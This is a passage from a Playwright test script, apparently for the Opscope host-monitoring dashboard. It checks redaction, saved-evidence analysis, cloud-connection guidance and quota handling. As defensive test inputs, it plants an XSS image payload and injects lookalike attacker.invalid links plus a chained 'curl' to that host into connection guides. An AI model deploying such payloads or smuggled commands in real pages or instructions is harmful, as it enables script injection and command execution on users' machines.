/* Run after: dotnet build tests/Opscope.ApiTests; npm ci --prefix tests/Opscope.ApiTests.
   Uses fixture evidence only inside the test host. No token or evidence is printed. */
const { chromium } = require('playwright');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { spawn } = require('node:child_process');
const { createHash } = require('node:crypto');
const root = path.resolve(__dirname, '../..');
const results = path.join(__dirname, 'test-results');
let server, browser, activePage, assertions = 0;
function check(value, message) { assert.ok(value, message); assertions++; console.log('PASS ' + message); }
async function startServer() {
  server = spawn(process.env.DOTNET_BIN || 'dotnet', ['run', '--no-build', '--project', 'tests/Opscope.ApiTests', '--', '--serve'], { cwd: root, env: process.env, stdio: ['ignore', 'pipe', 'pipe'] });
  return new Promise((resolve, reject) => {
    let output = '', errors = '';
    const timer = setTimeout(() => reject(new Error('Local fixture host did not become ready.')), 30000);
    server.stdout.on('data', data => { output += data.toString(); const match = output.match(/http:\/\/127\.0\.0\.1:\d+\/#token=[A-F0-9]+/); if (match) { clearTimeout(timer); resolve(match[0]); } });
    server.stderr.on('data', data => { errors += data.toString(); });
    server.once('error', reject);
    server.once('exit', code => { clearTimeout(timer); reject(new Error(`Local fixture host exited (${code}). ${errors.replace(/#token=\S+/g, '#token=[redacted]')}`)); });
  });
}
async function exerciseSavedEvidence(page, context, origin, token) {
  let analysisCalls = 0, collectionCalls = 0;
  const requests = request => {
    if (request.method() === 'POST' && request.url() === origin + '/api/analyze') analysisCalls++;
    if (request.method() === 'POST' && request.url() === origin + '/api/collect') collectionCalls++;
  };
  page.on('request', requests);
  const headers = { 'X-Opscope-Token': token };
  const saved = await (await context.request.get(origin + '/api/snapshot?full=true', { headers })).json();
  saved.host.hostname = 'saved-workbench-private-host'; saved.host.currentUser = 'saved-workbench-private-user';
  saved.collectedAtUtc = '2026-10-25T12:00:00+00:00'; saved.host.bootTimeUtc = '2026-10-25T10:00:00+00:00';
  saved.cpuUsedPercent = 96; saved.memory.usedPercent = 97;
  saved.processes = [{ id: 73, name: 'ioc-saved-worker', user: 'saved-workbench-private-user', workingSetBytes: 2097152, workingSetMb: 2, cpuTime: '00:01:00', commandLine: 'worker --password=saved-workbench-command-secret', accessLimited: false }];
  saved.services = [{ name: 'saved-worker.service', state: 'failed/failed', source: 'saved-fixture' }];
  saved.findings = [{ severity: 1, code: 'SAVED_XSS', title: '<img src=x onerror="window.__savedXss=1">', detail: 'saved-workbench-private-host password=saved-workbench-detail-secret', recommendation: 'Review saved evidence.' }];
  const snapshotFile = value => ({ name: 'saved.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(value)) });
  async function analyze(action, operation) {
    const pending = page.waitForResponse(response => response.url() === origin + '/api/analyze' && response.request().method() === 'POST' && response.request().postDataJSON().operation === operation);
    await action();
    const response = await pending;
    assert.equal(response.status(), 200, 'Saved analysis request completes successfully');
    return response.json();
  }
  async function saveDownload(selector, filename) {
    const pending = page.waitForEvent('download'); await page.locator(selector).click();
    const download = await pending, target = path.join(results, filename);
    fs.mkdirSync(results, { recursive: true }); await download.saveAs(target); return fs.readFileSync(target);
  }
  await page.locator('[data-view="overview"]').click();
  await page.locator('#full').check(); await page.getByText('api-private-host', { exact: true }).waitFor();
  await page.locator('[data-view="analysis"]').click();
  check(await page.locator('#source-context').textContent().then(text => text.includes('Saved snapshot') && text.includes('Always redacted')) && await page.locator('#full').isDisabled() && await page.locator('.full-toggle').isHidden(), 'Saved workspace states its separate always-redacted source and hides the live identifier preference');
  check(await page.locator('#collect').isHidden() && await page.locator('.search-wrap').isHidden(), 'Live collection and live search controls are hidden while inspecting saved evidence');
  await page.locator('#analysis-upload').setInputFiles({ name: 'too-large.json', mimeType: 'application/json', buffer: Buffer.alloc(2 * 1024 * 1024 + 1, ' ') });
  await page.locator('#analysis-error').waitFor();
  check(analysisCalls === 0 && await page.locator('#analysis-run').count() === 0, 'Oversized saved snapshot is rejected before a request or analysis state is created');
  await page.locator('#analysis-upload').setInputFiles({ name: 'invalid.json', mimeType: 'application/json', buffer: Buffer.from('{broken') });
  await page.locator('#analysis-error').waitFor();
  check(analysisCalls === 0, 'Malformed snapshot JSON is rejected locally before analysis submission');
  const inspected = await analyze(() => page.locator('#analysis-upload').setInputFiles(snapshotFile(saved)), 'inspect');
  await page.getByRole('heading', { name: 'Saved snapshot evidence', exact: true }).waitFor();
  check(inspected.cpuUsedPercent === 96 && inspected.host.hostname === '[redacted-host]' && await page.locator('.saved-summary').innerText().then(text => text.includes('96%')), 'Saved inspection presents the uploaded metrics and shared redaction rather than live host values');
  const inspectedText = await page.locator('#analysis-result').textContent();
  check(!inspectedText.includes('saved-workbench-private') && !inspectedText.includes('saved-workbench-command-secret') && !inspectedText.includes('saved-workbench-detail-secret'), 'Saved inspection removes host, user, command-line and finding secrets from rendered evidence');
  check(await page.locator('#analysis-result img').count() === 0 && await page.evaluate(() => window.__savedXss === undefined) && inspectedText.includes('<img'), 'Uploaded finding markup is rendered as text without creating executable image content');
  const inspectedDownload = JSON.parse(await saveDownload('#analysis-download', 'saved-inspect.json'));
  check(inspectedDownload.host.hostname === '[redacted-host]' && inspectedDownload.cpuUsedPercent === 96, 'Inspection download contains the selected saved snapshot and remains redacted');
  await page.locator('#analysis-operation').selectOption('triage');
  await page.locator('#analysis-scenario').selectOption('high-cpu');
  const triage = await analyze(() => page.locator('#analysis-run').click(), 'triage');
  await page.locator('#analysis-result .triage-steps li').first().waitFor();
  check(triage.kind === 'triage' && triage.data.scenario === 'high-cpu' && await page.locator('#analysis-result .triage-steps li').count() === triage.data.steps.length, 'Guided triage renders the shared analyzer steps for the selected saved scenario');
  await page.locator('#analysis-scenario').selectOption('port-exposed');
  check(await page.locator('#analysis-download').isDisabled() && await page.locator('#analysis-result').innerText().then(text => text.includes('Inputs changed')), 'Changing a triage scenario invalidates its old result and download');
  await page.locator('#analysis-operation').selectOption('ioc');
  const beforeLargeIndicator = analysisCalls;
  await page.locator('#analysis-ioc-text').fill('é'.repeat(65537));
  check(await page.locator('#analysis-run').isDisabled() && analysisCalls === beforeLargeIndicator, 'Indicator drafts use the UTF-8 byte limit rather than only a character count');
  await page.locator('#analysis-ioc-upload').setInputFiles({ name: 'too-large.csv', mimeType: 'text/csv', buffer: Buffer.alloc(128 * 1024 + 1, 'x') });
  await page.locator('#analysis-error').waitFor();
  check(analysisCalls === beforeLargeIndicator, 'Oversized indicator files are rejected before reaching the analyzer');
  const csv = 'type,value,label\nprocess,ioc-saved-worker,saved fixture\n';
  await page.locator('#analysis-ioc-text').fill(csv);
  await page.locator('#analysis-ioc-text').focus();
  await page.waitForTimeout(5500); // The fixture emits a live SSE sample every five seconds.
  check(await page.locator('#analysis-ioc-text').evaluate((node, text) => node === document.activeElement && node.value === text, csv) && await page.locator('#source-context').textContent().then(text => text.includes('Saved snapshot')), 'Live SSE updates preserve saved indicator drafts, focus and source context');
  const csvResult = await analyze(() => page.locator('#analysis-run').click(), 'ioc');
  await page.locator('#analysis-result td').filter({ hasText: 'ioc-saved-worker' }).first().waitFor();
  check(csvResult.kind === 'ioc' && csvResult.data.matches.length === 1, 'CSV indicator matching uses the uploaded process evidence without scanning the live host');
  const stix = JSON.stringify({ type: 'bundle', id: 'bundle--e095dd48-f564-4db1-a0d6-cb852d4107a3', objects: [{ type: 'indicator', spec_version: '2.1', id: 'indicator--d4ada3df-19d6-4b8a-ade8-324c29fa2f68', pattern_type: 'stix', pattern: "[process:name = 'ioc-saved-worker']", valid_from: '2026-10-25T00:00:00Z' }] });
  await page.locator('#analysis-ioc-upload').setInputFiles({ name: 'indicators.stix', mimeType: 'application/json', buffer: Buffer.from(stix) });
  await page.waitForFunction(() => document.getElementById('analysis-ioc-text')?.value.includes('bundle--e095dd48'));
  check(await page.locator('#analysis-ioc-format').inputValue() === 'stix', 'STIX file selection restores the actual format and draft text');
  const stixResult = await analyze(() => page.locator('#analysis-run').click(), 'ioc');
  await page.locator('#analysis-result td').filter({ hasText: 'ioc-saved-worker' }).first().waitFor();
  check(stixResult.data.matches.length === 1 && JSON.parse(await saveDownload('#analysis-download', 'saved-ioc.json')).kind === 'ioc', 'STIX matches and result download preserve the saved-analysis contract');
  await page.locator('#analysis-operation').selectOption('timeline');
  const before = structuredClone(saved); before.collectedAtUtc = '2026-10-25T11:00:00+00:00'; before.cpuUsedPercent = 8; before.services[0].state = 'active/running';
  await analyze(() => page.locator('#analysis-baseline-upload').setInputFiles({ name: 'before.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(before)) }), 'inspect');
  await page.waitForFunction(() => !document.getElementById('analysis-run')?.disabled);
  const timeline = await analyze(() => page.locator('#analysis-run').click(), 'timeline');
  await page.locator('#analysis-result td').filter({ hasText: 'drift' }).first().waitFor();
  check(timeline.kind === 'timeline' && timeline.data.events.some(event => event.kind === 'drift') && timeline.data.events.some(event => event.kind === 'boot'), 'Saved timeline merges the chosen snapshot, baseline differences and observed boot evidence');
  await page.locator('#analysis-export-format').selectOption('pdf');
  const pdf = await saveDownload('#analysis-export', 'saved-report.pdf');
  check(pdf.subarray(0, 5).toString() === '%PDF-' && !pdf.includes(Buffer.from('saved-workbench-private-host')), 'Saved PDF export uses the uploaded snapshot with shared redaction');
  const live = await (await context.request.get(origin + '/api/snapshot?full=true', { headers })).json();
  const retained = await (await context.request.get(origin + '/api/history', { headers })).json();
  check(live.host.hostname === 'api-private-host' && live.cpuUsedPercent === 17.5 && retained.every(row => row.cpuUsedPercent === 17.5) && collectionCalls === 0, 'Saved analyses leave the live collector and retained live history unchanged');
  await page.locator('#analysis-operation').selectOption('ioc');
  await page.locator('#analysis-ioc-text').fill(csv);
  await page.locator('[data-view="overview"]').click();
  await page.locator('[data-view="analysis"]').click();
  check(await page.locator('#analysis-ioc-text').inputValue() === csv && await page.locator('.saved-summary').innerText().then(text => text.includes('96%')), 'Navigation preserves saved drafts and selected evidence independently of the live source');
  await page.locator('#language').selectOption('es');
  check(await page.locator('#source-context').textContent().then(text => text.includes('Snapshot guardado')) && await page.locator('#analysis-ioc-text').inputValue() === csv, 'Spanish labels preserve the selected saved source and draft');
  await page.locator('#language').selectOption('en');
  await page.evaluate(fs.readFileSync(require.resolve('axe-core/axe.min.js'), 'utf8'));
  const originalTheme = await page.locator('html').getAttribute('data-theme');
  for (const theme of ['light', 'dark']) {
    if (await page.locator('html').getAttribute('data-theme') !== theme) await page.locator('#theme').click();
    await page.waitForTimeout(220);
    const violations = await page.evaluate(async () => (await axe.run(document, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21aa'] } })).violations);
    fs.writeFileSync(path.join(results, 'saved-accessibility-' + theme + '.json'), JSON.stringify(violations, null, 2));
    check(violations.length === 0, 'Saved workspace passes automated WCAG A/AA checks in the ' + theme + ' theme');
  }
  await page.setViewportSize({ width: 390, height: 844 });
  check(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), 'Saved workspace forms fit the mobile viewport without horizontal page overflow');
  await page.screenshot({ path: path.join(results, 'saved-workspace-mobile.png'), fullPage: true });
  await page.setViewportSize({ width: 1440, height: 1000 });
  if (await page.locator('html').getAttribute('data-theme') !== originalTheme) await page.locator('#theme').click();
  const stored = await page.evaluate(() => JSON.stringify([localStorage, sessionStorage]));
  check(!stored.includes('saved-workbench-private') && !stored.includes('ioc-saved-worker') && !stored.includes('saved-workbench-command-secret'), 'Saved snapshots and indicator drafts never enter browser storage');
  await page.getByRole('button', { name: 'Clear saved evidence', exact: true }).click();
  check(await page.locator('.saved-summary').count() === 0 && await page.locator('#analysis-download').count() === 0 && !await page.locator('#view').textContent().then(text => text.includes('ioc-saved-worker')), 'Clear saved evidence removes its snapshot, drafts and downloadable results');
  await page.locator('[data-view="overview"]').click();
  await page.locator('#full').uncheck(); await page.getByText('[redacted-host]', { exact: true }).waitFor();
  check(await page.locator('#source-context').textContent().then(text => text.includes('Live host')) && await page.locator('#collect').isVisible() && await page.locator('#full').isEnabled() && await page.locator('.full-toggle').isVisible(), 'Returning to live evidence restores the live source controls without importing saved state');
  page.off('request', requests);
}

async function exerciseConnections(page, origin) {
  await page.locator('[data-view="connections"]').click();
  await page.locator('.ops-connection-card').first().waitFor();
  check(await page.locator('.ops-connection-card').count() === 12 && await page.locator('#collect').isHidden() && await page.locator('.full-toggle').isHidden(), 'Connections lists all infrastructure and cluster providers with setup controls separated from live collection');
  check(await page.locator('#view').innerText().then(text => text.includes('without signing in or contacting a provider') && text.includes('Scope configured · access unverified')), 'Connection setup presence is distinct from a successful provider login or read permission');
  check(await page.locator('#view input').count() === 0 && await page.locator('#view textarea').count() === 0, 'Connection guidance never asks the browser to store a cloud password, API token or kubeconfig');
  await page.locator('#connection-provider').selectOption('gcp');
  check(await page.locator('.ops-connection-card pre').allTextContents().then(commands => commands.includes('gcloud auth login') && commands.includes('gcloud auth application-default login')) && await page.locator('#view').innerText().then(text => text.includes('CLI login alone does not configure ADC')), 'Google Cloud guidance distinguishes CLI sign-in from Application Default Credentials');
  check(await page.locator('.ops-connection-card a').evaluateAll(links => links.every(link => link.protocol === 'https:' && link.rel.includes('noreferrer') && link.rel.includes('noopener') && link.target === '_blank')), 'Account creation and sign-in guidance uses official HTTPS links without exposing an app referrer');
  await page.locator('#language').selectOption('es');
  check(await page.locator('#page-title').innerText() === 'Conexiones' && await page.locator('#view').innerText().then(text => text.includes('Las credenciales permanecen en el host de Opscope')), 'Spanish Connections explains where credentials stay without changing setup state');
  await page.locator('#language').selectOption('en');
  await page.locator('#connection-provider').selectOption('all');
  await page.screenshot({ path: path.join(results, 'connections-desktop.png'), fullPage: true });
  await page.setViewportSize({ width: 390, height: 844 });
  check(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), 'Connection status cards and host setup commands fit the mobile viewport');
  await page.screenshot({ path: path.join(results, 'connections-mobile.png'), fullPage: true });
  await page.setViewportSize({ width: 1440, height: 1000 });
  await page.evaluate(fs.readFileSync(require.resolve('axe-core/axe.min.js'), 'utf8'));
  for (const theme of ['light', 'dark']) {
    if (await page.locator('html').getAttribute('data-theme') !== theme) await page.locator('#theme').click();
    await page.waitForTimeout(220);
    const violations = await page.evaluate(async () => (await axe.run(document, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21aa'] } })).violations);
    fs.writeFileSync(path.join(results, 'connections-accessibility-' + theme + '.json'), JSON.stringify(violations, null, 2));
    check(violations.length === 0, 'Connections passes automated WCAG A/AA checks in the ' + theme + ' theme');
  }
  await page.locator('[data-view="overview"]').click();
}
async function exerciseConnectionGuards(browser, bootstrap, origin, token) {
  const context=await browser.newContext({viewport:{width:1440,height:1000}}),page=await context.newPage();
  await page.route('**/api/cloud/connections',async route=>{
    const data=await(await route.fetch()).json(),gcp=data.providers.find(provider=>provider.providerId==='gcp');
    gcp.guide.signUpUrl='https://attacker.invalid/collect';
    gcp.guide.consoleUrl='https://console.cloud.google.com.attacker.invalid/';
    gcp.guide.documentationUrl='https://attacker@cloud.google.com/';
    gcp.guide.steps.push({id:'bad-command',title:'Unsafe command',description:'Do not run fixture command.',commandTemplate:'gcloud auth login; curl https://attacker.invalid/'});
    gcp.testActions.push({actionKey:'gcp-scope-1/delete',operation:'delete',scopeAlias:'gcp-scope-1'},{actionKey:'gcp-scope-999/inventory',operation:'inventory',scopeAlias:'gcp-scope-999'});
    data.providers.push({...gcp,providerId:'malicious-provider',displayName:'UNKNOWN_PROVIDER'});
    await route.fulfill({json:data});
  });
  await page.goto(bootstrap);await page.getByRole('heading',{name:'Host evidence',exact:true}).waitFor();
  await page.locator('[data-view="connections"]').click();await page.locator('#connection-provider').selectOption('gcp');
  check(await page.locator('.ops-connection-card a').count()===0&&!await page.locator('#view pre').allTextContents().then(commands=>commands.some(command=>command.includes('curl'))), 'Connection guides reject lookalike hosts, URL userinfo and shell-command additions');
  check(await page.locator('#view button').allTextContents().then(labels=>!labels.some(label=>label.includes('/delete')||label.includes('scope-999')))&&!await page.locator('#view').innerText().then(text=>text.includes('UNKNOWN_PROVIDER')), 'Connection access tests require a known provider and the existing read-only catalogue action');
  const action='gcp-scope-1/metrics';
  for(const [status,state,code] of [[409,'NotConfigured','PROVIDER_NOT_CONFIGURED'],[424,'PermissionDenied','PROVIDER_PERMISSION_DENIED'],[429,'RateLimited','PROVIDER_RATE_LIMITED'],[502,'Failed','PROVIDER_UNAVAILABLE']]){
    await page.route('**/api/cloud/'+action,route=>route.fulfill({status,json:{kind:'cloud/gcp/metrics',collectedAtUtc:new Date().toISOString(),findings:[],warnings:['SAFE_PROVIDER_EVIDENCE'],operationSucceeded:false,data:{resources:[],coverage:{state}},cloudProblem:{httpStatus:status,code,message:'Provider fixture needs attention.',remediation:'Review host setup and read permissions.',nextStep:'open-connections',providerId:'gcp'}}}));
    await page.locator('[data-view="connections"]').click();await page.locator('#connection-provider').selectOption('gcp');
    const response=page.waitForResponse(response=>response.url()===origin+'/api/cloud/'+action&&response.request().method()==='POST');
    await page.getByRole('button',{name:'Test read access · '+action,exact:true}).click();assert.equal((await response).status(),status);
    await page.locator('#cloud-error').waitFor();
    check(await page.locator('#connection').getAttribute('data-state')!=='disconnected'&&await page.locator('#cloud-error').innerText().then(text=>text.includes('Review host setup and read permissions.'))&&await page.locator('.ops-cloud-result-summary pre').innerText().then(text=>JSON.parse(text).warnings.includes('SAFE_PROVIDER_EVIDENCE')), 'Provider '+status+' preserves its evidence and remediation without disconnecting the Opscope session');
    await page.unroute('**/api/cloud/'+action);
  }
  await context.close();
}
async function exerciseCloudFreshnessAndRetry(browser, bootstrap, origin) {
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } }), page = await context.newPage();
  const action = 'gcp-scope-1/metrics', observed = '2026-10-20T12:34:56+00:00';
  const report = { kind: 'cloud/gcp/metrics', collectedAtUtc: observed, findings: [], warnings: [], operationSucceeded: true, data: { resources: [], coverage: { state: 'Complete', observedAtUtc: observed, enumeratedResources: 4 } } };
  let mode = 'miss', reads = 0, collects = 0;
  await page.route('**/api/capabilities', async route => {
    const capabilities = await (await route.fetch()).json(); capabilities.cloud.push('gcp-scope-2/metrics');
    await route.fulfill({ json: capabilities });
  });
  await page.route('**/api/cloud/catalog', async route => {
    const catalog = await (await route.fetch()).json(), configured = catalog.actions.find(item => item.actionKey === action);
    catalog.actions.push({ ...configured, scopeAlias: 'gcp-scope-2', actionKey: 'gcp-scope-2/metrics' });
    await route.fulfill({ json: catalog });
  });
  await page.route('**/api/cloud/' + action, route => {
    reads++;
    const quota = mode === 'quota';
    return route.fulfill({ status: quota ? 429 : 200, headers: quota ? { 'Retry-After': '30', 'X-Opscope-Retry-Scope': 'gcp-scope-1', 'X-Opscope-Retry-Reason': 'provider-quota' } : {
      'X-Opscope-Cache': mode, 'X-Opscope-Cache-Age-Seconds': mode === 'hit' ? '7' : '0', 'X-Opscope-Cache-Remaining-Seconds': mode === 'hit' ? '53' : '60',
      'X-Opscope-Cache-Cached-At': '2026-10-28T08:00:00Z', 'X-Opscope-Cache-Expires-At': '2026-10-28T08:01:00Z'
    }, json: quota ? { ...report, operationSucceeded: false, data: { coverage: { state: 'RateLimited' } }, cloudProblem: { code: 'PROVIDER_RATE_LIMITED', message: 'Provider quota reached.', remediation: 'Wait before retrying this configured scope.' } } : report });
  });
  await page.route('**/api/collect', route => { collects++; return route.fulfill({ json: { collected: true } }); });
  await page.goto(bootstrap); await page.getByRole('heading', { name: 'Host evidence', exact: true }).waitFor();
  await page.locator('[data-view="cloud"]').click(); await page.locator('#cloud-provider').selectOption('gcp');
  const query = () => page.locator('button[data-cloud-action="' + action + '"]');
  await query().click(); await page.locator('.ops-cloud-cache[data-cache="miss"]').waitFor();
  check(await page.locator('.ops-cloud-cache').innerText().then(text => text.includes('New action result') && text.includes('Stored in this session') && text.includes('Cache expiry')) && await page.locator('[data-cloud-cache-age]').innerText() === '0 s', 'A cache miss labels a new action result with session cache timing');
  const observedFact = () => page.locator('.ops-cloud-result-summary > dl > div').filter({ has: page.locator('dt', { hasText: 'Observation time' }) }).locator('dd');
  const originalTime = await observedFact().innerText();
  mode = 'hit'; await query().click(); await page.locator('.ops-cloud-cache[data-cache="hit"]').waitFor();
  check(await page.locator('.ops-cloud-cache').innerText().then(text => text.includes('Retained result · no new provider read') && text.includes('original observation time')) && await page.locator('[data-cloud-cache-age]').innerText() === '7 s' && await page.locator('[data-cloud-cache-remaining]').innerText() === '53 s', 'A cache hit explicitly identifies reused evidence and its age and remaining reuse time');
  check(originalTime.includes('20 Oct 2026') && await observedFact().innerText() === originalTime && JSON.parse(await page.locator('.ops-cloud-result-summary pre').innerText()).collectedAtUtc === observed, 'Cache metadata preserves the original provider observation date instead of replacing it with cache storage time');
  await page.screenshot({ path: path.join(results, 'cloud-cache-hit.png'), fullPage: true });
  await page.waitForFunction(() => document.querySelector('[data-cloud-cache-age]')?.textContent !== '7 s');
  check(Number.parseInt(await page.locator('[data-cloud-cache-age]').innerText(), 10) >= 8 && Number.parseInt(await page.locator('[data-cloud-cache-remaining]').innerText(), 10) <= 52 && reads === 2, 'Cache age and remaining reuse time advance locally without another provider request');
  mode = 'quota'; await query().click(); await page.locator('#cloud-error').waitFor();
  check(await page.locator('button[data-cloud-action^="gcp-scope-1/"]').evaluateAll(buttons => buttons.length > 1 && buttons.every(button => button.disabled && button.textContent.includes('Retry in'))) && await page.locator('#connection').getAttribute('data-state') !== 'disconnected', 'Provider quota headers disable every action in the affected alias with a countdown while preserving the session');
  check(await page.locator('button[data-cloud-action="gcp-scope-2/metrics"]').isEnabled(), 'Provider quota isolation also leaves another alias of the same provider available');
  await page.locator('#cloud-provider').selectOption('hetzner');
  check(await page.locator('button[data-cloud-action="hetzner-scope-1/metrics"]').isEnabled(), 'A provider quota leaves a different configured provider available');
  await page.locator('[data-view="connections"]').click(); await page.locator('#connection-provider').selectOption('gcp');
  check(await page.locator('button[data-cloud-action="' + action + '"][data-cloud-mode="test"]').isDisabled(), 'Connections access tests share the affected alias cooldown');
  await page.locator('#connection-provider').selectOption('hetzner');
  check(await page.locator('button[data-cloud-action="hetzner-scope-1/metrics"][data-cloud-mode="test"]').isEnabled(), 'Connections access tests for other providers stay available during provider quota cooldown');
  await page.locator('[data-view="cloud"]').click(); await page.locator('#cloud-provider').selectOption('gcp');
  await page.waitForRequest(request => request.url() === origin + '/api/history', { timeout: 10000 });
  check(await page.locator('#connection').getAttribute('data-state') === 'connected' && await query().isDisabled(), 'Live SSE evidence continues arriving while the provider scope is cooling down');
  await page.locator('[data-view="overview"]').click();
  check(await page.locator('#collect').isEnabled(), 'A provider quota does not disable host collection');
  const collected = page.waitForResponse(response => response.url() === origin + '/api/collect' && response.request().method() === 'POST');
  await page.locator('#collect').click(); await collected;
  await page.waitForFunction(() => !document.getElementById('collect').disabled);
  check(collects === 1, 'Host collection can complete during an unrelated provider quota cooldown');
  await page.locator('[data-view="cloud"]').click(); await page.setViewportSize({ width: 390, height: 844 });
  check(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), 'Scoped retry countdown controls fit the mobile viewport');
  await page.screenshot({ path: path.join(results, 'cloud-provider-retry-mobile.png'), fullPage: true });
  await context.close();
  for (const kind of ['workspace-busy', 'local']) {
    const limitedContext = await browser.newContext({ viewport: { width: 1440, height: 1000 } }), limitedPage = await limitedContext.newPage();
    const cloudLimited = kind === 'workspace-busy';
    await limitedPage.route(cloudLimited ? '**/api/cloud/' + action : '**/api/collect', route => route.fulfill({ status: 429, headers: cloudLimited ? { 'Retry-After': '30', 'X-Opscope-Retry-Scope': 'gcp-scope-1', 'X-Opscope-Retry-Reason': 'workspace-busy' } : { 'Retry-After': '30' }, json: { error: 'Fixture workspace is busy.' } }));
    await limitedPage.goto(bootstrap); await limitedPage.getByRole('heading', { name: 'Host evidence', exact: true }).waitFor();
    if (cloudLimited) {
      await limitedPage.locator('[data-view="cloud"]').click(); await limitedPage.locator('#cloud-provider').selectOption('gcp');
      await limitedPage.locator('button[data-cloud-action="' + action + '"]').click(); await limitedPage.locator('#cloud-error').waitFor();
    } else { await limitedPage.locator('#collect').click(); await limitedPage.locator('#notice').filter({ hasText: 'Retry in 30 seconds' }).waitFor(); }
    await limitedPage.locator('[data-view="overview"]').click();
    check(cloudLimited ? await limitedPage.locator('#collect').isEnabled() : await limitedPage.locator('#collect').isDisabled(), cloudLimited ? 'A cloud workspace-busy response leaves host collection enabled' : 'A generic local 429 preserves the existing global host collection cooldown');
    await limitedPage.locator('[data-view="cloud"]').click(); await limitedPage.locator('#cloud-provider').selectOption('all');
    check(await limitedPage.locator('button[data-cloud-action]').evaluateAll(buttons => buttons.length > 2 && buttons.every(button => button.disabled)), cloudLimited ? 'A cloud workspace-busy response temporarily disables all cloud provider actions' : 'A generic local 429 also disables cloud actions during the global cooldown');
    await limitedPage.locator('[data-view="connections"]').click();
    check(await limitedPage.locator('button[data-cloud-mode="test"]').evaluateAll(buttons => buttons.length > 2 && buttons.every(button => button.disabled)), kind + ' cooldown also applies to Connections access tests');
    await limitedContext.close();
  }
}

async function exerciseEstimatedMemory(browser, bootstrap) {
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } }), page = await context.newPage();
  const sample = { schemaVersion: 1, source: 'local-lightweight', sequence: 1, elapsedMilliseconds: 5000, sampleIntervalSeconds: 5, sampledAtUtc: new Date().toISOString(), cpuPercent: 12.5, memoryPercent: 62.5, coverage: { cpu: 'available', memory: 'estimated' } };
  await page.route('**/api/metrics/history?*', route => route.fulfill({ json: { schemaVersion: 1, source: 'local-lightweight', samples: [sample] } }));
  await page.route('**/api/events', route => route.fulfill({ contentType: 'text/event-stream', body: 'event: metrics\ndata: ' + JSON.stringify(sample) + '\n\n' }));
  await page.goto(bootstrap); await page.getByRole('heading', { name: 'Host evidence', exact: true }).waitFor();
  await page.locator('.ops-chart__estimate').waitFor();
  check(await page.locator('.ops-chart__meta').innerText().then(text => text.includes('Memory includes estimates')) && await page.locator('.ops-chart__legend').innerText().then(text => text.includes('Memory *')), 'Estimated macOS memory samples have explicit chart metadata and legend labels');
  check(await page.locator('.ops-chart__estimate').innerText().then(text => text.includes('free and inactive pages as reclaimable') && text.includes('do not measure memory pressure')) && await page.locator('.ops-chart svg').getAttribute('aria-describedby') === await page.locator('.ops-chart__estimate').getAttribute('id'), 'The visible and accessible memory estimate note explains reclaimable pages without claiming exact memory pressure');
  await page.locator('.ops-chart details').evaluate(node => { node.open = true; });
  check(await page.locator('.ops-chart__table tbody tr').first().locator('td').last().innerText() === '62.5 *' && await page.locator('.ops-chart__table caption').innerText().then(text => text.includes('Memory includes estimates')), 'The accessible sample table retains the measured value and marks estimated memory');
  await page.screenshot({ path: path.join(results, 'macos-memory-estimate.png'), fullPage: true });
  await page.locator('#language').selectOption('es');
  check(await page.locator('.ops-chart__meta').innerText().then(text => text.includes('La memoria incluye estimaciones')) && await page.locator('.ops-chart__estimate').innerText().then(text => text.includes('No miden la presión de memoria')), 'Spanish charts preserve explicit memory estimate and pressure limitations');
  await context.close();
}

async function exerciseProxyBootstrap(browser, origin, token) {
  const context=await browser.newContext({viewport:{width:1440,height:1000}}),page=await context.newPage(),observed=[];
  await context.addCookies([{name:'opscope-fixture-session',value:'authenticated-fixture',url:origin,httpOnly:true,sameSite:'Strict'}]);
  await page.addInitScript(()=>{const original=window.fetch;window.__fetchOptions=[];window.fetch=(input,options={})=>{window.__fetchOptions.push({path:String(input),credentials:options.credentials,hasToken:new Headers(options.headers).has('X-Opscope-Token')});return original(input,options);};});
  const snapshot=await(await context.request.get(origin+'/api/snapshot',{headers:{'X-Opscope-Token':token}})).json();
  await page.route('**/api/**',async route=>{
    const request=route.request(),pathname=new URL(request.url()).pathname,headers=request.headers();observed.push({pathname,token:headers['x-opscope-token'],cookie:headers.cookie});
    if(pathname==='/api/session')return route.fulfill({json:{authenticationMode:'proxy',authenticated:true,readOnly:true}});
    if(pathname==='/api/events')return route.fulfill({status:200,contentType:'text/event-stream',body:'event: snapshot\ndata: '+JSON.stringify(snapshot)+'\n\n'});
    const upstreamHeaders={...headers,'X-Opscope-Token':token};delete upstreamHeaders.cookie;delete upstreamHeaders.authorization;
    const response=await route.fetch({headers:upstreamHeaders});return route.fulfill({response});
  });
  await page.goto(origin+'/');await page.getByRole('heading',{name:'Host evidence',exact:true}).waitFor();
  await page.waitForFunction(()=>window.__fetchOptions.some(request=>request.path==='/api/events'));
  check(await page.locator('#privacy').innerText().then(text=>text.includes('Authenticated proxy'))&&await page.locator('.brand-note').innerText()==='HOSTED'&&await page.locator('footer').innerText().then(text=>text.includes('Opscope host')), 'Explicit authenticated proxy bootstrap opens the hosted workspace without a token URL');
  check(observed.every(request=>!request.token&&request.cookie?.includes('opscope-fixture-session'))&&await page.evaluate(()=>window.__fetchOptions.every(request=>request.credentials==='same-origin'&&!request.hasToken)), 'Proxy bootstrap, API and SSE requests use same-origin authentication without a browser upstream token');
  check(page.url()===origin+'/'&&!await page.evaluate(()=>JSON.stringify([localStorage,sessionStorage,document.body.innerText])).then(text=>text.includes(token))&&await page.evaluate(()=>!document.cookie.includes('opscope-fixture-session')), 'Hosted session credentials and upstream secret remain outside browser URLs, storage, visible content and JavaScript cookies');
  await context.close();
  for(const session of [null,{authenticationMode:'local',authenticated:true,readOnly:true},{authenticationMode:'proxy',authenticated:false,readOnly:true}]){
    const deniedContext=await browser.newContext(),deniedPage=await deniedContext.newPage();let evidenceRequests=0;
    deniedPage.on('request',request=>{if(new URL(request.url()).pathname==='/api/snapshot')evidenceRequests++;});
    if(session)await deniedPage.route('**/api/session',route=>route.fulfill({json:session}));
    await deniedPage.goto(origin+'/');await deniedPage.locator('#notice').filter({hasText:'bootstrap URL'}).waitFor();
